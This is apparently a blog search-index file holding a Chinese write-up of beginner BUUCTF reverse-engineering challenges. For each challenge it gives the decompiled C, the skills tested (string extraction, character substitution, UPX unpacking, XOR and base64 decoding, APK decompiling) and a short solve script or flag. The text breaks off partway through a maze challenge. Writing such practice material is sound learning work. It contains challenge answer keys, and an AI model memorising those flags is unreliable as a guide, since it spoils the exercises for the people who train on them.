<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Reverse-BUUCTF-1</title>
    <link href="/Reverse-BUUCTF-1/"/>
    <url>/Reverse-BUUCTF-1/</url>
    
    <content type="html"><![CDATA[<h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a><font style="color:rgb(33, 37, 41);">easyre</font></h1><blockquote><p>考点</p><ul><li>二进制工具使用</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> b; // [rsp+28h] [rbp-8h] BYREF<br>  <span class="hljs-built_in">int</span> b_1; // [rsp+2Ch] [rbp-4h] BYREF<br><br>  _main();<br>  scanf(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;b_1, &amp;b);<br>  <span class="hljs-keyword">if</span> ( b_1 == b )<br>    printf(<span class="hljs-string">&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    printf(<span class="hljs-string">&quot;sorry,you can&#x27;t get flag&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 因为它是以字符串常量出现，那么只要能看到二进制形式就能找到flag</span><br>flag&#123;this_Is_a_EaSyRe&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a><font style="color:rgb(33, 37, 41);">reverse1</font></h1><blockquote><p>考点</p><ul><li>字符替换</li><li>动态调试</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main_0(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char *v3; // rdi<br>  __int64 i; // rcx<br>  size_t __hello_world__; // rax<br>  char v7; // [rsp+0h] [rbp-20h] BYREF<br>  <span class="hljs-built_in">int</span> j; // [rsp+24h] [rbp+4h]<br>  char Str1[<span class="hljs-number">224</span>]; // [rsp+48h] [rbp+28h] BYREF<br>  __int64 j_1; // [rsp+128h] [rbp+108h]<br><br>  v3 = &amp;v7;<br>  <span class="hljs-keyword">for</span> ( i = 82LL; i; --i )<br>  &#123;<br>    *(_DWORD *)v3 = -<span class="hljs-number">858993460</span>;<br>    v3 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; ; ++j )<br>  &#123;<br>    j_1 = j;<br>    <span class="hljs-keyword">if</span> ( j &gt; j_strlen(Str2) )                   // <span class="hljs-string">&quot;&#123;hello_world&#125;&quot;</span><br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( Str2[j] == <span class="hljs-string">&#x27;o&#x27;</span> )                       // <span class="hljs-string">&quot;&#123;hello_world&#125;&quot;</span><br>      Str2[j] = <span class="hljs-string">&#x27;0&#x27;</span>;                            // <span class="hljs-string">&quot;&#123;hello_world&#125;&quot;</span><br>  &#125;<br>  sub_1400111D1(<span class="hljs-string">&quot;input the flag:&quot;</span>);<br>  sub_14001128F(<span class="hljs-string">&quot;%20s&quot;</span>, Str1);<br>  __hello_world__ = j_strlen(Str2);             // <span class="hljs-string">&quot;&#123;hello_world&#125;&quot;</span><br>  <span class="hljs-keyword">if</span> ( !strncmp(<br>          Str1,<br>          Str2,                                 // <span class="hljs-string">&quot;&#123;hello_world&#125;&quot;</span><br>          __hello_world__) )<br>    sub_1400111D1(<span class="hljs-string">&quot;this is the right flag!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    sub_1400111D1(<span class="hljs-string">&quot;wrong flag\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 程序逻辑是将o替换成0</span><br><span class="hljs-comment">## 由于替换逻辑优先于check，且对已有的字符串进行替换，那么如果能调试，就可以获得flag</span><br>flag&#123;hell0_w0rld&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a><font style="color:rgb(33, 37, 41);">reverse2</font></h1><blockquote><p>考点</p><ul><li>字符替换</li><li>子进程</li><li>动态调试</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> stat_loc; // [rsp+4h] [rbp-3Ch] BYREF<br>  <span class="hljs-built_in">int</span> i; // [rsp+8h] [rbp-38h]<br>  __pid_t pid; // [rsp+Ch] [rbp-34h]<br>  char s2[<span class="hljs-number">24</span>]; // [rsp+10h] [rbp-30h] BYREF<br>  unsigned __int64 v8; // [rsp+28h] [rbp-18h]<br><br>  v8 = __readfsqword(0x28u);<br>  pid = fork();<br>  <span class="hljs-keyword">if</span> ( pid )<br>  &#123;<br>    waitpid(pid, &amp;stat_loc, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    // <span class="hljs-string">&quot;&#123;hacking_for_fun&#125;&quot;</span><br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= strlen(flag); ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( flag[i] == <span class="hljs-string">&#x27;i&#x27;</span> || flag[i] == <span class="hljs-string">&#x27;r&#x27;</span> )   // <span class="hljs-string">&quot;&#123;hacking_for_fun&#125;&quot;</span><br>        flag[i] = <span class="hljs-string">&#x27;1&#x27;</span>;                          // <span class="hljs-string">&quot;&#123;hacking_for_fun&#125;&quot;</span><br>    &#125;<br>  &#125;<br>  printf(<span class="hljs-string">&quot;input the flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%20s&quot;</span>, s2);<br>  <span class="hljs-keyword">if</span> ( !strcmp(<br>          flag,                                 // <span class="hljs-string">&quot;&#123;hacking_for_fun&#125;&quot;</span><br>          s2) )<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;this is the right flag!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;wrong flag!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 程序逻辑是将i、r替换成1</span><br><span class="hljs-comment">## 由于替换逻辑优先于check，且对已有的字符串进行替换，那么如果能调试，就可以获得flag</span><br>flag&#123;hack1ng_fo1_fun&#125;<br></code></pre></td></tr></table></figure><h1 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a><font style="color:rgb(33, 37, 41);">内涵的软件</font></h1><blockquote><p>考点</p><ul><li>二进制工具的使用</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main_0(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">4</span>]; // [esp+4Ch] [ebp-Ch] BYREF<br>  const char *DBAPP_49d3c93df25caad81232130f3d2ebfad_; // [esp+50h] [ebp-8h]<br>  <span class="hljs-built_in">int</span> n5; // [esp+54h] [ebp-4h]<br><br>  n5 = <span class="hljs-number">5</span>;<br>  DBAPP_49d3c93df25caad81232130f3d2ebfad_ = <span class="hljs-string">&quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;</span>;<br>  <span class="hljs-keyword">while</span> ( n5 &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    printf(&amp;Format_, n5);<br>    sub_40100A();<br>    --n5;<br>  &#125;<br>  printf(asc_425088);<br>  v4[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>  scanf(<span class="hljs-string">&quot;%c&quot;</span>, v4);<br>  <span class="hljs-keyword">if</span> ( v4[<span class="hljs-number">0</span>] == <span class="hljs-number">89</span> )<br>  &#123;<br>    printf(aOd);<br>    <span class="hljs-keyword">return</span> sub_40100A();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[<span class="hljs-number">0</span>] == <span class="hljs-number">78</span> )<br>      printf(&amp;Format__0);<br>    <span class="hljs-keyword">else</span><br>      printf(&amp;Format__1);<br>    <span class="hljs-keyword">return</span> sub_40100A();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 打开就有</span><br>flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;<br></code></pre></td></tr></table></figure><h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a><font style="color:rgb(33, 37, 41);">新年快乐</font></h1><blockquote><p>考点</p><ul><li>upx脱壳技术</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char Str2[<span class="hljs-number">14</span>]; // [esp+12h] [ebp-3Ah] BYREF<br>  char Str1[<span class="hljs-number">44</span>]; // [esp+20h] [ebp-2Ch] BYREF<br><br>  __main();<br>  strcpy(Str2, <span class="hljs-string">&quot;HappyNewYear!&quot;</span>);<br>  memset(Str1, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>  printf(<span class="hljs-string">&quot;please input the true flag:&quot;</span>);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, Str1);<br>  <span class="hljs-keyword">if</span> ( !strncmp(Str1, Str2, strlen(Str2)) )<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;this is true flag!&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># EXP</span><br><span class="hljs-comment">## 使用upx.exe -d &lt;filename&gt;.exe来进行脱壳，当然也有手动脱壳的</span><br>flag&#123;HappyNewYear!&#125;<br></code></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a><font style="color:rgb(33, 37, 41);">xor</font></h1><blockquote><p>考点</p><ul><li>xor</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> i; // [rsp+2Ch] [rbp-124h]<br>  char __b[<span class="hljs-number">264</span>]; // [rsp+40h] [rbp-<span class="hljs-number">1</span>10h] BYREF<br><br>  memset(__b, <span class="hljs-number">0</span>, 0x100uLL);<br>  printf(<span class="hljs-string">&quot;Input your flag:\n&quot;</span>);<br>  get_line(__b, 256LL);<br>  <span class="hljs-keyword">if</span> ( strlen(__b) != <span class="hljs-number">33</span> )<br>    goto LABEL_7;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">33</span>; ++i )<br>    __b[i] ^= __b[i - <span class="hljs-number">1</span>];<br>  <span class="hljs-keyword">if</span> ( !strncmp(<br>          __b,<br>          <span class="hljs-keyword">global</span>,                               // <span class="hljs-string">&quot;f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv\&quot;M#D\x0Eg\x06h\x0FG2O&quot;</span><br>          0x21uLL) )<br>    printf(<span class="hljs-string">&quot;Success&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>LABEL_7:<br>    printf(<span class="hljs-string">&quot;Failed&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// EXP</span><br><span class="hljs-comment">// 这里用c脚本</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aFKWOXZUPFVMDGH[<span class="hljs-number">34</span>] = &#123;<br>    <span class="hljs-number">0x66</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x11</span>, <br>    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x32</span>, <br>    <span class="hljs-number">0x4F</span>,<span class="hljs-number">0x00</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">32</span>; i &gt; <span class="hljs-number">0</span> ; i--)&#123;<br>        aFKWOXZUPFVMDGH[i] ^= aFKWOXZUPFVMDGH[i<span class="hljs-number">-1</span>];<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,aFKWOXZUPFVMDGH);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a><font style="color:rgb(33, 37, 41);">reverse3</font></h1><blockquote><p>考点</p><ul><li>base64加密</li><li>base算法识别</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main_0(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  size_t v3; // eax<br>  const char *Source; // eax<br>  size_t MaxCount; // eax<br>  char v7; // [esp+0h] [ebp-188h]<br>  char v8; // [esp+0h] [ebp-188h]<br>  signed <span class="hljs-built_in">int</span> j; // [esp+DCh] [ebp-ACh]<br>  <span class="hljs-built_in">int</span> i; // [esp+E8h] [ebp-A0h]<br>  signed <span class="hljs-built_in">int</span> j_1; // [esp+E8h] [ebp-A0h]<br>  char Destination[<span class="hljs-number">108</span>]; // [esp+F4h] [ebp-94h] BYREF<br>  char Str[<span class="hljs-number">28</span>]; // [esp+160h] [ebp-28h] BYREF<br>  _BYTE v14[<span class="hljs-number">8</span>]; // [esp+17Ch] [ebp-Ch] BYREF<br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-built_in">int</span>)i &gt;= <span class="hljs-number">0x64</span> )<br>      j____report_rangecheckfailure();<br>    Destination[i] = <span class="hljs-number">0</span>;<br>  &#125;<br>  sub_41132F(<span class="hljs-string">&quot;please enter the flag:&quot;</span>, v7);<br>  sub_411375(<span class="hljs-string">&quot;%20s&quot;</span>, (char)Str);<br>  v3 = j_strlen(Str);<br>  Source = (const char *)sub_4110BE(Str, v3, v14);<br>  strncpy(Destination, Source, 0x28u);<br>  j_1 = j_strlen(Destination);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; j_1; ++j )<br>    Destination[j] += j;<br>  MaxCount = j_strlen(Destination);<br>  <span class="hljs-keyword">if</span> ( !strncmp(<br>          Destination,<br>          Str2,                                 // <span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>          MaxCount) )<br>    sub_41132F(<span class="hljs-string">&quot;rigth flag!\n&quot;</span>, v8);<br>  <span class="hljs-keyword">else</span><br>    sub_41132F(<span class="hljs-string">&quot;wrong flag!\n&quot;</span>, v8);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 使用base64加密算法以及加法实现加密，利用base64与减法解密算法实现逆向</span><br><span class="hljs-keyword">import</span> base64<br><br>enc = <span class="hljs-string">&#x27;e3nifIH9b_C@n@dH&#x27;</span><br>enc = <span class="hljs-built_in">list</span>(enc)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(enc[i])-i)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#x27;</span>+base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(enc)).decode())<br></code></pre></td></tr></table></figure><h1 id="helloword"><a href="#helloword" class="headerlink" title="helloword"></a><font style="color:rgb(33, 37, 41);">helloword</font></h1><blockquote><p>考点</p><ul><li>java类APK文件</li><li>android反编译工具jeb、jadx等使用</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">package com.example.helloword;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.support.v7.app.ActionBarActivity;<br><span class="hljs-keyword">import</span> android.view.Menu;<br><span class="hljs-keyword">import</span> android.view.MenuItem;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> extends ActionBarActivity &#123;<br><span class="hljs-meta">    @Override  // android.support.v7.app.ActionBarActivity</span><br>    protected void onCreate(Bundle savedInstanceState) &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        this.setContentView(<span class="hljs-number">0x7F030018</span>);  // layout:activity_main<br>    &#125;<br><br><span class="hljs-meta">    @Override  // android.app.Activity</span><br>    public boolean onCreateOptionsMenu(Menu menu) &#123;<br>        this.getMenuInflater().inflate(<span class="hljs-number">0x7F0C0000</span>, menu);  // menu:main<br>        <span class="hljs-keyword">return</span> true;<br>    &#125;<br><br><span class="hljs-meta">    @Override  // android.app.Activity</span><br>    public boolean onOptionsItemSelected(MenuItem item) &#123;<br>        <span class="hljs-keyword">return</span> item.getItemId() == <span class="hljs-number">0x7F05003C</span> ? true : <span class="hljs-built_in">super</span>.onOptionsItemSelected(item);  // <span class="hljs-built_in">id</span>:action_settings<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## flag在smali中</span><br>flag&#123;7631a988259a00816deda84afb29430a&#125;<br></code></pre></td></tr></table></figure><h1 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a><font style="color:rgb(33, 37, 41);">不一样的flag</font></h1><blockquote><p>考点</p><ul><li>maze类（5*5）<ul><li>找起始点</li><li>是否是三维</li></ul></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl __noreturn main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char _11110100001010000101111_[<span class="hljs-number">29</span>]; // [esp+17h] [ebp-35h] BYREF<br>  <span class="hljs-built_in">int</span> v4; // [esp+34h] [ebp-18h]<br>  <span class="hljs-built_in">int</span> n4; // [esp+38h] [ebp-14h] BYREF<br>  <span class="hljs-built_in">int</span> i; // [esp+3Ch] [ebp-10h]<br>  _BYTE v7[<span class="hljs-number">12</span>]; // [esp+40h] [ebp-Ch] BYREF<br><br>  __main();<br>  _11110100001010000101111_[<span class="hljs-number">26</span>] = <span class="hljs-number">0</span>;<br>  *(_WORD *)&amp;_11110100001010000101111_[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  strcpy(_11110100001010000101111_, <span class="hljs-string">&quot;*11110100001010000101111#&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;you can choose one action to execute&quot;</span>);<br>    puts(<span class="hljs-string">&quot;1 up&quot;</span>);<br>    puts(<span class="hljs-string">&quot;2 down&quot;</span>);<br>    puts(<span class="hljs-string">&quot;3 left&quot;</span>);<br>    printf(<span class="hljs-string">&quot;4 right\n:&quot;</span>);<br>    scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n4);<br>    <span class="hljs-keyword">if</span> ( n4 == <span class="hljs-number">2</span> )<br>    &#123;<br>      ++*(_DWORD *)&amp;_11110100001010000101111_[<span class="hljs-number">25</span>];<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( n4 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( n4 == <span class="hljs-number">3</span> )<br>      &#123;<br>        --v4;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( 